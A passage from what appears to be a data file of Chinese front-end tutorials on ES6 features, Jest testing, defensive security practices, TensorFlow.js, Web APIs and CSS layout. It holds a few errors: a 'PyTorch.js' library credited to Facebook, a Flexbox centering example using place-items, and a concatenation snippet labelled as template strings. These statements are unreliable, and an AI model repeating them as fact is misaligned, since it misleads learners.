// user = {}; // TypeError

// 冻结对象使其完全不可变
const frozenUser = Object.freeze({ name: 'Alice' });
// frozenUser.name = 'Bob'; // 静默失败（严格模式下报错）
\`\`\`

**箭头函数：**
箭头函数提供了更简洁的函数语法，并且自动绑定词法 this。箭头函数没有自己的 this、arguments、super 或 new.target，适合用于回调函数和需要保持外层 this 上下文的场景。

\`\`\`javascript
// 传统函数
const add = function(a, b) {
  return a + b;
};

// 箭头函数
const add = (a, b) => a + b;

// 单参数可省略括号
const double = x => x * 2;

// 返回对象需要括号
const createUser = (name, age) => ({ name, age });

// this 绑定示例
const obj = {
  name: 'Alice',
  
  // 传统函数：this 指向调用者
  greetTraditional: function() {
    setTimeout(function() {
      console.log('Hello, ' + this.name); // undefined（this 丢失）
    }, 100);
  },
  
  // 箭头函数：this 继承自外层
  greetArrow: function() {
    setTimeout(() => {
      console.log('Hello, ' + this.name); // 'Hello, Alice'
    }, 100);
  },
  
  // 箭头函数作为方法：this 指向外层作用域
  greetMethod: () => {
    console.log('Hello, ' + this.name); // undefined（this 指向全局）
  },
};

// 箭头函数不能作为构造函数
const Person = (name) => {
  this.name = name;
};
// new Person('Alice'); // TypeError

// 箭头函数没有 arguments
const fn = () => {
  // console.log(arguments); // ReferenceError
};
\`\`\`

**模板字符串：**
模板字符串使用反引号（\`）包裹，支持多行字符串、变量插值和表达式嵌入。模板字符串让字符串拼接更加直观和方便，特别适合生成 HTML 模板、SQL 查询等场景。

\`\`\`javascript
// 基本用法
const name = 'Alice';
const greeting = \`Hello, \${name}!\`;
console.log(greeting); // 'Hello, Alice!'

// 多行字符串
const html = \`
  <div class="card">
    <h2>\${title}</h2>
    <p>\${content}</p>
  </div>
\`;

// 表达式嵌入
const a = 10;
const b = 20;
console.log(\`\${a} + \${b} = \${a + b}\`); // '10 + 20 = 30'

// 嵌套模板
const items = ['Apple', 'Banana', 'Orange'];
const list = \`
  <ul>
    \${items.map(item => \`<li>\${item}</li>\`).join('')}
  </ul>
\`;

// 标签模板
function highlight(strings, ...values) {
  return strings.reduce((result, str, i) => {
    const value = values[i] ? \`<mark>\${values[i]}</mark>\` : '';
    return result + str + value;
  }, '');
}

const search = 'JavaScript';
const text = highlight\`Learning \${search} is fun!\`;
// 'Learning <mark>JavaScript</mark> is fun!'

// 原始字符串
const raw = String.raw\`Line 1\\nLine 2\`;
console.log(raw); // 'Line 1\\nLine 2'（不转义）
\`\`\`

**解构赋值：**
解构赋值允许从数组或对象中提取值，并赋给变量。解构赋值可以简化代码，使数据提取更加直观。支持数组解构、对象解构、函数参数解构等多种形式。

\`\`\`javascript
// 数组解构
const [first, second, ...rest] = [1, 2, 3, 4, 5];
console.log(first); // 1
console.log(second); // 2
console.log(rest); // [3, 4, 5]

// 跳过元素
const [, , third] = [1, 2, 3];
console.log(third); // 3

// 默认值
const [a = 10, b = 20] = [1];
console.log(a, b); // 1, 20

// 交换变量
let x = 1, y = 2;
[x, y] = [y, x];

// 对象解构
const user = { name: 'Alice', age: 25, city: 'NYC' };
const { name, age, country = 'USA' } = user;
console.log(name, age, country); // 'Alice', 25, 'USA'

// 重命名
const { name: userName, age: userAge } = user;
console.log(userName, userAge); // 'Alice', 25

// 嵌套解构
const company = {
  name: 'Tech Corp',
  address: {
    city: 'San Francisco',
    country: 'USA',
  },
};
const { address: { city } } = company;
console.log(city); // 'San Francisco'

// 函数参数解构
function greet({ name, age = 0 }) {
  console.log(\`Hello, \${name}! You are \${age} years old.\`);
}
greet({ name: 'Alice', age: 25 });

// 解构配合默认参数
function fetchData({ url, method = 'GET', headers = {} } = {}) {
  console.log(url, method, headers);
}
fetchData({ url: '/api/data' });
\`\`\`

**默认参数：**
ES6 允许为函数参数设置默认值，当参数为 undefined 时使用默认值。默认参数使函数更加健壮，减少了对参数检查的需求。

\`\`\`javascript
// 基本默认参数
function greet(name = 'World') {
  console.log(\`Hello, \${name}!\`);
}
greet(); // 'Hello, World!'
greet('Alice'); // 'Hello, Alice!'

// 默认参数可以是表达式
function getValue(value = computeDefault()) {
  return value;
}

// 默认参数可以引用前面的参数
function greet(name, greeting = \`Hello, \${name}\`) {
  console.log(greeting);
}
greet('Alice'); // 'Hello, Alice'

// 默认参数与解构结合
function createUser({ name = 'Anonymous', age = 0 } = {}) {
  return { name, age };
}
createUser(); // { name: 'Anonymous', age: 0 }
createUser({ name: 'Alice' }); // { name: 'Alice', age: 0 }

// 必需参数
function required(paramName) {
  throw new Error(\`Parameter \${paramName} is required\`);
}

function createUser(name = required('name'), age) {
  return { name, age };
}
// createUser(); // Error: Parameter name is required
\`\`\`

**剩余参数和扩展运算符：**
剩余参数（...args）将多余的参数收集为数组，扩展运算符（...）将数组或对象展开。这两个特性让函数参数处理和数据操作更加灵活。

\`\`\`javascript
// 剩余参数
function sum(...numbers) {
  return numbers.reduce((total, n) => total + n, 0);
}
sum(1, 2, 3, 4, 5); // 15

// 剩余参数必须是最后一个参数
function log(level, ...messages) {
  console.log(\`[\${level}]\`, ...messages);
}
log('INFO', 'User', 'logged in'); // '[INFO] User logged in'

// 扩展运算符 - 数组
const arr1 = [1, 2, 3];
const arr2 = [4, 5, 6];
const merged = [...arr1, ...arr2]; // [1, 2, 3, 4, 5, 6]

// 复制数组
const copy = [...arr1];

// 扩展运算符 - 对象
const obj1 = { a: 1, b: 2 };
const obj2 = { c: 3, d: 4 };
const mergedObj = { ...obj1, ...obj2 }; // { a: 1, b: 2, c: 3, d: 4 }

// 覆盖属性
const config = { timeout: 1000, retry: 3 };
const customConfig = { ...config, timeout: 2000 }; // { timeout: 2000, retry: 3 }

// 函数调用中使用扩展
const numbers = [1, 2, 3];
Math.max(...numbers); // 3
Math.max.apply(null, numbers); // ES5 方式

// 类数组转数组
const nodeList = document.querySelectorAll('div');
const nodes = [...nodeList];

// 字符串转数组
const chars = [...'hello']; // ['h', 'e', 'l', 'l', 'o']
\`\`\`

**类：**
- 类语法糖
- 继承
- 静态方法
- 私有方法（ES2022）

**模块：**
- import 和 export
- 模块化开发

### ES7 (ES2016) 及以后的特性

**ES7：**
- 指数运算符：**
- Array.prototype.includes()

**ES8 (ES2017)：**
- async/await
- Object.values() 和 Object.entries()
- String.prototype.padStart() 和 padEnd()

**ES9 (ES2018)：**
- 异步迭代器
- Rest/Spread 属性
- 正则表达式改进

**ES10 (ES2019)：**
- Array.prototype.flat() 和 flatMap()
- String.prototype.trimStart() 和 trimEnd()
- Object.fromEntries()

**ES11 (ES2020)：**
- Optional Chaining：?.
- Nullish Coalescing：??
- BigInt
- Dynamic Import

**ES12 (ES2021)：**
- Logical Assignment Operators：&&=, ||=, ??=
- Numeric Separators：1_000_000
- String.prototype.replaceAll()

**ES13 (ES2022)：**
- Top-level await
- Private fields and methods
- Class static blocks

### 最佳实践

**代码风格：**
- 使用 let 和 const 代替 var
- 优先使用箭头函数
- 使用模板字符串
- 合理使用解构赋值

**性能考虑：**
- 避免过度使用扩展运算符
- 合理使用 async/await
- 注意 BigInt 的性能

**兼容性：**
- 使用 Babel 转译
- 了解目标环境的支持情况
- 使用 polyfill

**可读性：**
- 保持代码简洁
- 使用有意义的变量名
- 适当的注释

**安全性：**
- 注意模板字符串的注入风险
- 避免使用 eval
- 合理使用 Optional Chaining

### 实际应用

**前端开发：**
- 组件开发
- 状态管理
- 异步操作
- 工具函数

**Node.js 开发：**
- 服务器端代码
- API 开发
- 脚本编写
- 工具开发

**代码示例：**

\`\`\`javascript
// 使用箭头函数和模板字符串
const greet = name => "Hello, " + name + "!";

// 使用解构赋值
const { name, age } = user;

// 使用 async/await
async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data');
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error:', error);
  }
}

// 使用 Optional Chaining
const username = user?.profile?.name;

// 使用 Nullish Coalescing
const value = input ?? 'default';
\`\`\`

### 学习资源

- MDN Web Docs
- ECMAScript 规范
- JavaScript.info
- 前端技术博客
- 开源项目源码`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-testing",title:"JavaScript 测试策略与最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","测试","Jest","单元测试"],content:`## JavaScript 测试策略与最佳实践

测试是保证代码质量的重要手段，JavaScript 有丰富的测试工具和框架。

### 测试类型

**单元测试：**
- 测试单个函数或组件
- 隔离测试
- 快速反馈

**集成测试：**
- 测试多个组件或模块的交互
- 模拟真实场景
- 验证功能完整性

**端到端测试：**
- 测试整个应用流程
- 模拟用户操作
- 验证用户体验

**性能测试：**
- 测试代码性能
- 识别性能瓶颈
- 确保性能符合要求

**安全测试：**
- 测试代码安全性
- 识别安全漏洞
- 确保代码安全

### 测试工具

**测试框架：**
- Jest：Facebook 开发，功能丰富：Jest是Facebook开发的JavaScript测试框架，与React项目完美集成，提供零配置、快照测试、模拟功能等特性，Jest支持并行测试、代码覆盖率报告，是前端单元测试的行业标准，支持TypeScript、Babel、Webpack等工具链
- Mocha：灵活，可定制性强
- Jasmine：BDD 风格
- Vitest：Vite 生态，快速：Vitest是基于Vite的测试框架，提供与Jest兼容的API，利用Vite的ES模块支持实现极快的测试启动速度，Vitest支持TypeScript、JSX、快照测试、模拟功能，是Vite生态中的测试工具，适合现代前端项目

**断言库：**
- Chai：支持多种断言风格
- Jest 内置断言
- Node.js 内置 assert

**测试工具：**
- React Testing Library：React 组件测试
- Testing Library：通用组件测试
- Cypress：端到端测试
- Playwright：端到端测试，支持多浏览器：Playwright是Microsoft开发的端到端测试框架，支持Chrome、Firefox、Safari、Edge等所有现代浏览器，提供跨浏览器测试能力，Playwright支持自动等待、网络拦截、截图、视频录制等高级功能，API设计简洁，支持TypeScript，是现代E2E测试的首选工具

**模拟工具：**
- Sinon：函数模拟和间谍
- Jest 内置模拟
- MSW：API 模拟

### 测试策略

**测试覆盖率：**
- 语句覆盖率：执行了多少语句
- 分支覆盖率：执行了多少分支
- 函数覆盖率：执行了多少函数
- 行覆盖率：执行了多少行

**测试组织：**
- 按模块组织测试
- 按功能组织测试
- 测试文件名与被测试文件对应

**测试编写：**
- 描述清晰的测试用例
- 测试边界情况
- 测试错误处理
- 保持测试独立

**测试执行：**
- 本地执行测试
- CI/CD 执行测试
- 并行执行测试
- 缓存测试结果

### 最佳实践

**测试设计：**
- 测试行为而非实现
- 保持测试简洁
- 避免测试依赖
- 模拟外部依赖

**测试维护：**
- 定期运行测试
- 修复失败的测试
- 更新测试以适应代码变化
- 移除过时的测试

**测试与开发：**
- 测试驱动开发 (TDD)
- 行为驱动开发 (BDD)
- 持续集成
- 持续部署

**性能考虑：**
- 避免缓慢的测试
- 合理使用测试超时
- 并行执行测试
- 缓存测试结果

### 实际应用

**前端测试：**
- 组件测试
- 状态管理测试
- 工具函数测试
- API 调用测试

**Node.js 测试：**
- 服务端测试
- API 测试
- 中间件测试
- 数据库操作测试

**测试示例：**

// 单元测试示例
const { sum } = require('./math');

test('sum adds two numbers', () => {
  expect(sum(1, 2)).toBe(3);
});

test('sum handles negative numbers', () => {
  expect(sum(-1, -2)).toBe(-3);
});

test('sum handles zero', () => {
  expect(sum(0, 0)).toBe(0);
});

// React 组件测试示例
import { render, screen, fireEvent } from '@testing-library/react';
import Button from './Button';

test('Button renders with text', () => {
  render(<Button>Click me</Button>);
  expect(screen.getByText('Click me')).toBeInTheDocument();
});

test('Button calls onClick when clicked', () => {
  const handleClick = jest.fn();
  render(<Button onClick={handleClick}>Click me</Button>);
  fireEvent.click(screen.getByText('Click me'));
  expect(handleClick).toHaveBeenCalledTimes(1);
});

### 学习资源

- Jest 文档
- Testing Library 文档
- Cypress 文档
- 测试驱动开发书籍
- 前端测试实践博客`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-security",title:"JavaScript 安全最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","安全","XSS","CSRF"],content:`## JavaScript 安全最佳实践

安全是 JavaScript 开发的重要考虑因素，以下是一些关键的安全最佳实践。

### 常见安全问题

**XSS (跨站脚本攻击)：**
- 攻击者注入恶意脚本
- 窃取用户数据或会话
- 重定向用户到恶意网站

**CSRF (跨站请求伪造)：**
- 攻击者诱导用户执行非预期操作
- 如修改密码、转账等
- 利用用户的认证状态

**SQL 注入：**
- 攻击者注入 SQL 语句
- 访问或修改数据库
- 可能导致数据泄露

**敏感数据暴露：**
- 硬编码 API 密钥
- 在前端存储敏感数据
- 未加密传输数据

**依赖漏洞：**
- 使用有漏洞的依赖包
- 未及时更新依赖
- 依赖链攻击

### 防护措施

**XSS 防护：**
- 对用户输入进行验证和清理
- 使用 Content-Security-Policy (CSP)
- 避免使用 dangerouslySetInnerHTML
- 使用 React 等框架的内置转义

**CSRF 防护：**
- 使用 CSRF 令牌
- 验证 Origin 和 Referer 头
- 使用 SameSite Cookie 属性
- 实现正确的 CORS 策略

**SQL 注入防护：**
- 使用参数化查询
- 避免拼接 SQL 语句
- 使用 ORM 框架
- 最小权限原则

**敏感数据保护：**
- 不在前端存储敏感数据
- 使用 HTTPS 传输数据
- 加密敏感数据
- 使用环境变量管理配置

**依赖安全：**
- 定期更新依赖
- 使用 npm audit 检查漏洞
- 配置 dependabot 自动更新
- 使用 Snyk 等安全工具

### 安全编码实践

**输入验证：**
- 对所有用户输入进行验证
- 使用正则表达式验证格式
- 限制输入长度
- 过滤特殊字符

**输出编码：**
- 对输出进行 HTML 编码
- 对 JSON 数据进行正确处理
- 避免直接拼接 HTML

**密码处理：**
- 使用 bcrypt 等算法哈希密码
- 实现密码强度检查
- 支持多因素认证
- 定期提醒用户更新密码

**会话管理：**
- 使用安全的会话存储
- 设置合理的会话过期时间
- 实现会话刷新机制
- 处理会话劫持

**错误处理：**
- 不暴露详细的错误信息给用户
- 记录错误日志
- 实现统一的错误处理
- 避免信息泄露

### 安全工具和监控

**安全工具：**
- ESLint 安全插件
- Snyk：依赖安全扫描
- OWASP ZAP：安全测试
- Burp Suite：安全测试

**监控和日志：**
- 监控异常行为
- 记录安全相关事件
- 实现入侵检测
- 定期安全审计

**安全响应：**
- 建立安全响应流程
- 及时处理安全漏洞
- 发布安全补丁
- 通知用户安全事件

### 最佳实践

**安全意识：**
- 培训开发团队的安全意识
- 定期进行安全培训
- 建立安全编码规范
- 进行安全代码审查

**安全架构：**
- 分层安全设计
- 最小权限原则
- 防御纵深
- 安全默认配置

**合规性：**
- 遵守 GDPR、CCPA 等法规
- 保护用户隐私
- 实现数据保护措施
- 定期合规审计

**持续改进：**
- 定期进行安全评估
- 学习最新的安全威胁
- 更新安全措施
- 参与安全社区`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-ai",title:"JavaScript 与人工智能的结合",category:"javascript",difficulty:"hard",tags:["JavaScript","AI","Machine Learning","TensorFlow.js"],content:`## JavaScript 与人工智能的结合

JavaScript 正在成为人工智能和机器学习的重要平台，特别是在前端和边缘计算领域。

### JavaScript AI 生态系统

**TensorFlow.js：**
- Google 开发的机器学习库
- 支持在浏览器和 Node.js 中运行
- 预训练模型和自定义模型

**PyTorch.js：**
- Facebook 开发的机器学习库
- 支持在浏览器中运行 PyTorch 模型
- 动态计算图

**ml5.js：**
- 基于 TensorFlow.js 的高级库
- 简化机器学习的使用
- 适合教育和原型开发

**Brain.js：**
- 轻量级神经网络库
- 支持各种神经网络类型
- 易于使用的 API

### 应用场景

**计算机视觉：**
- 图像分类
- 物体检测
- 面部识别
- 姿态估计

**自然语言处理：**
- 情感分析
- 文本分类
- 命名实体识别
- 机器翻译

**语音识别：**
- 语音转文本
- 说话人识别
- 语音合成

**推荐系统：**
- 个性化推荐
- 协同过滤
- 内容过滤

**强化学习：**
- 游戏 AI
- 机器人控制
- 资源优化

### 实现方式

**预训练模型：**
- 使用现成的预训练模型
- 减少训练时间和资源
- 适合快速原型开发

**模型转换：**
- 将 Python 训练的模型转换为 JavaScript
- 使用 TensorFlow.js Converter
- 支持 ONNX 格式

**浏览器内训练：**
- 在浏览器中训练模型
- 利用用户设备的计算能力
- 保护用户隐私

**边缘计算：**
- 在客户端运行模型
- 减少服务器负载
- 提高响应速度

### 性能优化

**模型优化：**
- 模型量化
- 模型压缩
- 模型蒸馏

**推理优化：**
- WebAssembly 加速
- WebGL 加速
- SIMD 指令

**加载优化：**
- 模型懒加载
- 模型缓存
- 渐进式加载

**内存管理：**
- 合理使用内存
- 释放不再使用的模型
- 避免内存泄漏

### 最佳实践

**用户体验：**
- 提供加载状态
- 处理模型加载失败
- 优化推理速度
- 提供降级方案

**隐私保护：**
- 本地处理数据
- 避免发送敏感数据到服务器
- 明确的隐私政策

**兼容性：**
- 检测浏览器支持
- 提供降级方案
- 测试不同设备

**开发流程：**
- 原型设计
- 模型选择
- 性能测试
- A/B 测试

### 实际应用

**前端应用：**
- 实时图像识别
- 语音助手
- 个性化内容
- 交互式学习

**Node.js 应用：**
- 服务器端推理
- 数据处理
- 自动化工具
- 推荐系统

**物联网：**
- 边缘设备 AI
- 传感器数据分析
- 智能控制

**游戏开发：**
- NPC 行为
- 游戏平衡
- 玩家分析

### 学习资源

- TensorFlow.js 文档
- ml5.js 文档
- JavaScript AI 教程
- 开源项目示例
- 在线课程`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-web-apis",title:"JavaScript Web APIs 深度解析",category:"javascript",difficulty:"medium",tags:["JavaScript","Web APIs","DOM","Fetch"],content:`## JavaScript Web APIs 深度解析

Web APIs 是浏览器提供的一组接口，使 JavaScript 能够与浏览器和操作系统交互。

### DOM API

**DOM 操作：**
- 选择元素：querySelector、querySelectorAll
- 创建元素：createElement、createTextNode
- 修改元素：appendChild、removeChild、replaceChild
- 属性操作：setAttribute、getAttribute、removeAttribute

**事件处理：**
- 事件监听：addEventListener、removeEventListener
- 事件类型：click、input、scroll、resize
- 事件对象：event.target、event.preventDefault、event.stopPropagation
- 事件委托：利用事件冒泡

**DOM 遍历：**
- 父节点：parentNode、parentElement
- 子节点：childNodes、children
- 兄弟节点：nextSibling、previousSibling、nextElementSibling、previousElementSibling

**DOM 样式：**
- style 属性：element.style.property
- classList：add、remove、toggle、contains
- getComputedStyle：获取计算后的样式

### Fetch API

**基本用法：**
- fetch() 函数：返回 Promise
- 请求配置：method、headers、body、mode
- 响应处理：response.json()、response.text()、response.blob()

**请求类型：**
- GET：获取资源
- POST：提交数据
- PUT：更新资源
- DELETE：删除资源
- PATCH：部分更新

**错误处理：**
- 网络错误：Promise 拒绝
- HTTP 错误：需要手动检查 status
- 超时处理：AbortController

**高级特性：**
- 跨域请求：CORS
- 认证：headers、credentials
- 缓存：cache 选项
- 重定向：redirect 选项

### 存储 API

**localStorage：**
- 持久存储
- 最大容量约 5MB
- 字符串键值对
- 同源策略

**sessionStorage：**
- 会话存储
- 标签页关闭后清除
- 最大容量约 5MB
- 字符串键值对

**IndexedDB：**
- 结构化存储
- 较大容量
- 异步 API
- 支持索引

**Cookie：**
- 小型文本文件
- 自动发送到服务器
- 最大容量约 4KB
- 过期时间控制

### 其他常用 Web APIs

**地理位置 API：**
- navigator.geolocation
- getCurrentPosition：获取当前位置
- watchPosition：监视位置变化

**通知 API：**
- Notification 构造函数
- requestPermission：请求权限
- 发送桌面通知

**媒体 API：**
- MediaDevices：访问摄像头和麦克风
- MediaRecorder：录制媒体
- AudioContext：音频处理

**Web Workers：**
- 后台线程
- 避免阻塞主线程
- 消息传递
- 适合计算密集型任务

**Service Workers：**
- 网络代理
- 离线缓存
- 推送通知
- 后台同步

**Web Sockets：**
- 双向通信
- 实时数据
- 低延迟
- 适合聊天、游戏等

### 最佳实践

**性能优化：**
- 减少 DOM 操作
- 使用事件委托
- 合理使用存储
- 优化网络请求

**兼容性：**
- 检测 API 支持
- 提供降级方案
- 使用 polyfill

**安全性：**
- 验证用户输入
- 防止 XSS
- 保护存储数据
- 使用 HTTPS

**代码组织：**
- 模块化 API 调用
- 错误处理
- 响应式设计
- 可访问性

### 实际应用

**前端应用：**
- 表单处理
- 数据可视化
- 实时通信
- 离线功能

**交互体验：**
- 拖拽功能
- 键盘导航
- 触摸事件
- 动画效果

**工具开发：**
- 浏览器扩展
- 开发工具
- 性能分析工具

**PWA (渐进式 Web 应用)：**
- 离线访问
- 安装到主屏幕
- 推送通知
- 后台同步`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-box-model",title:"CSS 盒模型深度解析",category:"css",difficulty:"easy",tags:["CSS","盒模型","布局基础"],content:`## CSS 盒模型深度解析

CSS 盒模型是网页布局的基础，理解盒模型对于掌握 CSS 布局至关重要。

### 📦 盒模型的组成

**标准盒模型：**
- **content**：内容区域，显示文本和图像
- **padding**：内边距，内容与边框之间的空间
- **border**：边框，围绕内边距的线
- **margin**：外边距，边框外部的空间

**盒模型的计算：**
- **标准盒模型：width = content width**
- **IE 盒模型：width = content + padding + border**
- **box-sizing 属性控制盒模型类型**

**box-sizing 属性：**
- **content-box**：标准盒模型（默认值）
- **border-box**：IE 盒模型，更直观的尺寸计算
- **inherit**：继承父元素的值

### 💻 代码示例：盒模型对比

\`\`\`css
/* 标准盒模型（默认） */
.box-standard {
  box-sizing: content-box;
  width: 300px;
  padding: 20px;
  border: 5px solid #000;
  /* 实际占用宽度 = 300 + 20*2 + 5*2 = 350px */
}

/* IE 盒模型 */
.box-border {
  box-sizing: border-box;
  width: 300px;
  padding: 20px;
  border: 5px solid #000;
  /* 实际占用宽度 = 300px（包含 padding 和 border） */
  /* 内容宽度 = 300 - 20*2 - 5*2 = 250px */
}
\`\`\`

#### 全局设置 border-box

\`\`\`css
/* 推荐的全局设置 */
*,
*::before,
*::after {
  box-sizing: border-box;
}

/* 这样所有元素都使用 border-box，计算更直观 */
.container {
  width: 100%;
  padding: 20px;
  border: 1px solid #ccc;
  /* 实际宽度就是 100%，padding 和 border 包含在内 */
}
\`\`\`

#### 外边距折叠示例

\`\`\`css
/* 相邻兄弟元素的外边距折叠 */
.box1 {
  margin-bottom: 20px;
}

.box2 {
  margin-top: 30px;
  /* 实际间距 = max(20px, 30px) = 30px，不是 50px */
}

/* 防止外边距折叠的方法 */
.parent {
  margin-top: 20px;
  padding-top: 1px; /* 方法1：添加 padding */
  border-top: 1px solid transparent; /* 方法2：添加 border */
  overflow: hidden; /* 方法3：创建 BFC */
  display: flex; /* 方法4：使用 flex 布局 */
}

.child {
  margin-top: 30px;
  /* 现在不会折叠，总间距 = 20px + 30px = 50px */
}
\`\`\`

### 最佳实践

- 统一使用 border-box 盒模型
- 理解 margin 的折叠行为
- 合理使用 padding 和 margin
- 注意百分比值的计算基准
- 使用开发者工具调试盒模型`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-flexbox",title:"Flexbox 弹性布局详解",category:"css",difficulty:"medium",tags:["CSS","Flexbox","弹性布局"],content:`## Flexbox 弹性布局详解

Flexbox（弹性盒子布局）是 CSS3 引入的一维布局模型，专门用于处理元素在容器中的排列、对齐和分布。

### Flexbox 基础概念

**Flex 容器和项目：**
- display: flex 创建 Flex 容器
- 容器的直接子元素成为 Flex 项目
- 主轴（main axis）和交叉轴（cross axis）

**主轴方向：**
- flex-direction: row（默认值，水平从左到右）
- flex-direction: row-reverse（水平从右到左）
- flex-direction: column（垂直从上到下）
- flex-direction: column-reverse（垂直从下到上）

**换行控制：**
- flex-wrap: nowrap（默认值，不换行）
- flex-wrap: wrap（允许换行）
- flex-wrap: wrap-reverse（反向换行）

### 主轴对齐

**justify-content 属性：**
- flex-start：项目向主轴起点对齐
- flex-end：项目向主轴终点对齐
- center：项目在主轴上居中
- space-between：项目均匀分布，首尾贴边
- space-around：项目均匀分布，周围有空间
- space-evenly：项目均匀分布，间距相等

### 交叉轴对齐

**align-items 属性（单行）：**
- stretch（默认值）：项目拉伸填充容器
- flex-start：项目向交叉轴起点对齐
- flex-end：项目向交叉轴终点对齐
- center：项目在交叉轴上居中
- baseline：项目基线对齐

**align-content 属性（多行）：**
- stretch（默认值）：行拉伸填充容器
- flex-start：行向交叉轴起点对齐
- flex-end：行向交叉轴终点对齐
- center：行在交叉轴上居中
- space-between：行均匀分布
- space-around：行均匀分布，周围有空间

### Flex 项目属性

**flex-grow：**
- 定义项目的放大比例
- 默认值为 0，不放大
- 值为 1 时，项目占据剩余空间

**flex-shrink：**
- 定义项目的缩小比例
- 默认值为 1，空间不足时缩小
- 值为 0 时，项目不缩小

**flex-basis：**
- 定义项目在分配多余空间之前的初始大小
- 可以是长度值或 auto
- 优先级高于 width/height

**flex 简写：**
- flex: flex-grow flex-shrink flex-basis
- flex: 1 表示 flex: 1 1 0%
- flex: auto 表示 flex: 1 1 auto

### 代码示例

#### 水平垂直居中

\`\`\`css
/* 方法1：最常用的居中方式 */
.center-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* 方法2：使用 margin: auto */
.center-container {
  display: flex;
  height: 100vh;
}

.center-item {
  margin: auto;
}

/* 方法3：使用 place-items（简写） */
.center-container {
  display: flex;
  place-items: center;
  height: 100vh;
}
\`\`\`

#### 三栏布局（两边固定，中间自适应）

\`\`\`css
.container {
  display: flex;
  height: 100vh;
}

.sidebar-left {
  width: 200px;
  flex-shrink: 0; /* 防止缩小 */
  background-color: #f5f5f5;
}

.main-content {
  flex: 1; /* flex-grow: 1, flex-shrink: 1, flex-basis: 0% */
  background-color: #fff;
}

.sidebar-right {
  width: 250px;
  flex-shrink: 0; /* 防止缩小 */
  background-color: #f5f5f5;
}

/* 响应式：小屏幕时改为单列 */
@media (max-width: 768px) {
  .container {
    flex-direction: column;
  }

  .sidebar-left,
  .sidebar-right {
    width: 100%;
  }
}
\`\`\`

#### 等高布局

\`\`\`css
.card-container {
  display: flex;
  gap: 20px;
}

.card {
  flex: 1;
  /* align-items: stretch 是默认值，所以卡片会自动等高 */
  padding: 20px;
  border: 1px solid #ddd;
}

/* 即使卡片内容高度不同，所有卡片也会等高 */
\`\`\`

### 最佳实践

- 优先使用 Flexbox 进行一维布局
- 合理使用 flex 简写属性
- 注意浏览器兼容性（IE10+）
- 结合媒体查询实现响应式布局
- 避免过度嵌套 Flex 容器
- 使用 flex: 1 实现自适应布局
- 使用 gap 属性设置间距（现代浏览器）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-grid",title:"CSS Grid 网格布局详解",category:"css",difficulty:"medium",tags:["CSS","Grid","网格布局"],content:`## CSS Grid 网格布局详解

CSS Grid（网格布局）是 CSS 最强大的二维布局系统，可以同时处理行和列，创建复杂的网页布局。

### Grid 基础概念

**Grid 容器和项目：**
- display: grid 创建 Grid 容器
- 容器的直接子元素成为 Grid 项目
- 网格线（grid line）、网格轨道（grid track）、网格单元（grid cell）

**定义网格：**
- grid-template-columns：定义列
- grid-template-rows：定义行
- 可以使用长度、百分比、fr 单位、repeat() 函数

**fr 单位：**
- 分数单位，表示剩余空间的比例
- 1fr 占据一份剩余空间
- 可以与其他单位混合使用

### 代码示例

#### 圣杯布局

\`\`\`css
.container {
  display: grid;
  min-height: 100vh;
  grid-template-areas:
    "header header header"
    "sidebar main aside"
    "footer footer footer";
  grid-template-columns: 200px 1fr 200px;
  grid-template-rows: auto 1fr auto;
  gap: 20px;
}

.header {
  grid-area: header;
  background-color: #333;
  color: white;
  padding: 20px;
}

.sidebar {
  grid-area: sidebar;
  background-color: #f5f5f5;
  padding: 20px;
}

.main {
  grid-area: main;
  background-color: #fff;
  padding: 20px;
}

.aside {
  grid-area: aside;
  background-color: #f5f5f5;
  padding: 20px;
}

.footer {
  grid-area: footer;
  background-color: #333;
  color: white;
  padding: 20px;
}

/* 响应式：小屏幕时改为单列 */
@media (max-width: 768px) {
  .container {
    grid-template-areas:
      "header"
      "main"
      "sidebar"
      "aside"
      "footer";
    grid-template-columns: 1fr;
    grid-template-rows: auto;
  }
}
\`\`\`

#### 响应式卡片网格

\`\`\`css
.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 20px;
  padding: 20px;
}

.card {
  background-color: #fff;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 20px;
  transition: transform 0.3s, box-shadow 0.3s;
}

.card:hover {
  transform: translateY(-5px);
  box-shadow: 0 4px 8px rgba(0,0,0,0.15);
}

/* auto-fit 会自动根据容器宽度调整列数 */
/* minmax(300px, 1fr) 确保每列最小 300px，最大平分剩余空间 */
\`\`\`

### 最佳实践

- 二维布局优先使用 Grid
- 一维布局使用 Flexbox
- 结合两者使用（Grid 布局，Flexbox 对齐）
- 使用 grid-template-areas 提高可读性
- 注意浏览器兼容性（现代浏览器支持良好）
- 使用 fr 单位实现弹性布局
- 使用 minmax() 实现响应式
- 使用 gap 属性设置间距`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-position",title:"CSS 定位机制详解",category:"css",difficulty:"medium",tags:["CSS","定位","position"],content:`## CSS 定位机制详解

CSS 定位允许你控制元素在页面上的位置，是布局的重要工具。理解定位机制对于创建复杂的布局至关重要。

### 定位类型

**static（默认值）：**
- 正常文档流定位
- 不受 top、right、bottom、left 影响
- 元素按照 HTML 顺序排列

**relative：**
- 相对定位，相对于元素在正常文档流中的位置
- 不脱离文档流，保留原位置空间
- 使用 top、right、bottom、left 进行偏移

**absolute：**
- 绝对定位，相对于最近的定位祖先元素
- 脱离文档流，不保留原位置空间
- 如果没有定位祖先，相对于初始包含块（通常是视口）

**fixed：**
- 固定定位，相对于视口
- 脱离文档流
- 滚动时保持位置不变

**sticky：**
- 粘性定位，相对和固定的混合
- 在阈值之前是相对定位，之后是固定定位
- 需要指定 top、right、bottom 或 left

### 代码示例

#### 模态框实现

\`\`\`css
/* 模态框遮罩 */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
